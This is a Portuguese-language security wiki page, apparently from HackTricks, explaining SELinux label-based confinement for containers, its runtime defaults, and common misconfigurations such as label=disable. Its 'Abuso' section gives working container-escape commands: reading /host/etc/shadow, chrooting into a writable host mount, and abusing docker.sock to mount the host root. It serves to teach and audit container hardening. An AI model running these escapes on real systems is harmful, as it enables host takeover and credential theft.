# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Visão geral

SELinux é um sistema de **Mandatory Access Control baseado em labels**. Todo processo e objeto relevante pode carregar um contexto de segurança, e a policy decide quais domínios podem interagir com quais tipos e de que maneira. Em ambientes containerizados, isso normalmente significa que o runtime inicia o processo do container sob um domínio de container confinado e atribui ao conteúdo do container os tipos correspondentes. Se a policy estiver funcionando corretamente, o processo poderá ler e gravar as coisas que sua label deve acessar, enquanto o acesso a outro conteúdo do host será negado, mesmo que esse conteúdo se torne visível por meio de um mount.

Essa é uma das proteções do lado do host mais poderosas disponíveis nas principais implementações de containers Linux. Ela é especialmente importante no Fedora, RHEL, CentOS Stream, OpenShift e em outros ecossistemas centrados em SELinux. Nesses ambientes, um reviewer que ignora o SELinux frequentemente entenderá mal por que um caminho aparentemente óbvio para comprometer o host está, na verdade, bloqueado.

## AppArmor Vs SELinux

A diferença geral mais fácil de entender é que o AppArmor é baseado em paths, enquanto o SELinux é **baseado em labels**. Isso tem grandes consequências para a segurança de containers. Uma policy baseada em paths pode se comportar de maneira diferente se o mesmo conteúdo do host se tornar visível sob um path de mount inesperado. Uma policy baseada em labels, por outro lado, verifica qual é a label do objeto e o que o domínio do processo pode fazer com ele. Isso não torna o SELinux simples, mas o torna resistente a uma classe de suposições baseadas em truques com paths que defenders às vezes fazem acidentalmente em sistemas baseados em AppArmor.

Como o modelo é orientado a labels, o gerenciamento de volumes de containers e as decisões de relabeling são críticos para a segurança. Se o runtime ou o operador alterar as labels de maneira muito ampla para "fazer os mounts funcionarem", a boundary da policy que deveria conter o workload poderá se tornar muito mais fraca do que o pretendido.

## Lab

Para verificar se o SELinux está ativo no host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Para inspecionar os labels existentes no host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Para comparar uma execução normal com uma em que a rotulagem está desabilitada:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Em um host com SELinux habilitado, esta é uma demonstração muito prática porque mostra a diferença entre uma workload executada sob o container domain esperado e outra da qual essa camada de enforcement foi removida.

## Uso em Runtime

O Podman está particularmente bem alinhado ao SELinux em sistemas nos quais o SELinux faz parte do padrão da plataforma. Podman rootless mais SELinux é uma das bases de containers mainstream mais fortes, porque o processo já é unprivileged no lado do host e ainda permanece confinado pela política MAC. O Docker também pode usar SELinux quando há suporte, embora administradores às vezes o desabilitem para contornar problemas com volume-labeling. CRI-O e OpenShift dependem fortemente do SELinux como parte de sua estratégia de isolamento de containers. O Kubernetes também pode expor configurações relacionadas ao SELinux, mas seu valor obviamente depende de o sistema operacional do node realmente oferecer suporte e aplicar o SELinux.<sup>[[2]](#references)</sup>

A lição recorrente é que o SELinux não é um enfeite opcional. Nos ecossistemas construídos ao seu redor, ele faz parte do limite de segurança esperado.

## Misconfigurações

O erro clássico é `label=disable`. Operacionalmente, isso geralmente acontece porque um volume mount foi negado e a resposta rápida de curto prazo foi remover o SELinux da equação, em vez de corrigir o modelo de labeling.<sup>[[1]](#references)</sup> Outro erro comum é o relabeling incorreto de conteúdo do host. Operações amplas de relabel podem fazer a aplicação funcionar, mas também podem ampliar muito além do originalmente pretendido o que o container pode acessar.

Também é importante não confundir SELinux **instalado** com SELinux **efetivo**. Um host pode oferecer suporte ao SELinux e ainda estar no modo permissive, ou o runtime pode não estar iniciando a workload sob o domain esperado. Nesses casos, a proteção é muito mais fraca do que a documentação pode sugerir.

## Abuso

Quando o SELinux está ausente, em modo permissive ou amplamente desabilitado para a workload, os paths montados do host tornam-se muito mais fáceis de abusar. O mesmo bind mount que, de outra forma, seria restringido por labels pode se tornar uma via direta para acessar dados do host ou modificá-lo. Isso é especialmente relevante quando combinado com writable volume mounts, diretórios do container runtime ou atalhos operacionais que expõem paths sensíveis do host por conveniência.

O SELinux frequentemente explica por que um writeup genérico de breakout funciona imediatamente em um host, mas falha repetidamente em outro, mesmo quando os runtime flags parecem semelhantes. O ingrediente ausente geralmente não é um namespace nem uma capability, mas um limite de label que permaneceu intacto.

A verificação prática mais rápida é comparar o contexto ativo e, em seguida, testar paths montados do host ou diretórios do runtime que normalmente seriam confinados por labels:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Se uma montagem bind do host estiver presente e a rotulagem do SELinux tiver sido desativada ou enfraquecida, a divulgação de informações geralmente vem primeiro:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Se o mount for writable e o container for efetivamente host-root do ponto de vista do kernel, o próximo passo é testar uma modificação controlada no host em vez de fazer suposições:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Em hosts compatíveis com SELinux, a perda de labels ao redor dos diretórios de estado de runtime também pode expor caminhos diretos para privilege escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Esses comandos não substituem uma cadeia completa de escape, mas deixam claro rapidamente se era o SELinux que estava impedindo o acesso aos dados do host ou a modificação de arquivos no lado do host.

### Exemplo completo: SELinux desabilitado + montagem gravável do host

Se a atribuição de rótulos do SELinux estiver desabilitada e o sistema de arquivos do host estiver montado com permissão de escrita em `/host`, um escape completo do host se torna um caso comum de abuso de bind mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Se o `chroot` for bem-sucedido, o processo do container agora está operando a partir do filesystem do host:
```bash
id
hostname
cat /etc/passwd | tail
```
### Exemplo Completo: SELinux Desativado + Diretório de Runtime

Se o workload puder alcançar um socket de runtime quando os labels estiverem desativados, o escape poderá ser delegado ao runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
A observação relevante é que o SELinux frequentemente era o controle que impedia exatamente esse tipo de acesso a caminhos do host ou ao estado do runtime.

## Verificações

O objetivo das verificações do SELinux é confirmar que o SELinux está habilitado, identificar o contexto de segurança atual e verificar se os arquivos ou caminhos de seu interesse estão realmente confinados por labels.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
O que é interessante aqui:

- `getenforce` deve idealmente retornar `Enforcing`; `Permissive` ou `Disabled` altera o significado de toda a seção sobre SELinux.
- Se o contexto do processo atual parecer inesperado ou amplo demais, o workload pode não estar sendo executado sob a policy de container pretendida.
- Se arquivos montados a partir do host ou diretórios de runtime tiverem labels que o processo consegue acessar livremente demais, os bind mounts se tornam muito mais perigosos.

Ao analisar um container em uma plataforma compatível com SELinux, não trate o labeling como um detalhe secundário. Em muitos casos, ele é uma das principais razões pelas quais o host ainda não foi comprometido.

## Padrões de Runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Depende do host | A separação do SELinux está disponível em hosts com SELinux habilitado, mas o comportamento exato depende da configuração do host/daemon | `--security-opt label=disable`, relabeling amplo de bind mounts, `--privileged` |
| Podman | Normalmente habilitado em hosts com SELinux | A separação do SELinux é uma parte normal do Podman em sistemas com SELinux, salvo se estiver desabilitada | `--security-opt label=disable`, `label=false` em `containers.conf`, `--privileged` |
| Kubernetes | Geralmente não atribuído automaticamente no nível do Pod | Há suporte ao SELinux, mas os Pods normalmente precisam de `securityContext.seLinuxOptions` ou de defaults específicos da plataforma; o suporte do runtime e do node é necessário | `seLinuxOptions` fracos ou amplos, execução em nodes permissive/disabled, policies da plataforma que desabilitam o labeling |
| CRI-O / deployments no estilo OpenShift | Normalmente utilizado intensivamente | O SELinux costuma ser uma parte central do modelo de isolamento do node nesses ambientes | policies personalizadas que ampliam demais o acesso, desabilitação do labeling por motivos de compatibilidade |

Os defaults do SELinux dependem mais da distribuição do que os defaults do seccomp. Em sistemas no estilo Fedora/RHEL/OpenShift, o SELinux costuma ser central para o modelo de isolamento. Em sistemas sem SELinux, ele simplesmente não existe.

## Referências

- [1] [Podman Documentation: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

{{#include ../../../../banners/hacktricks-training.md}}
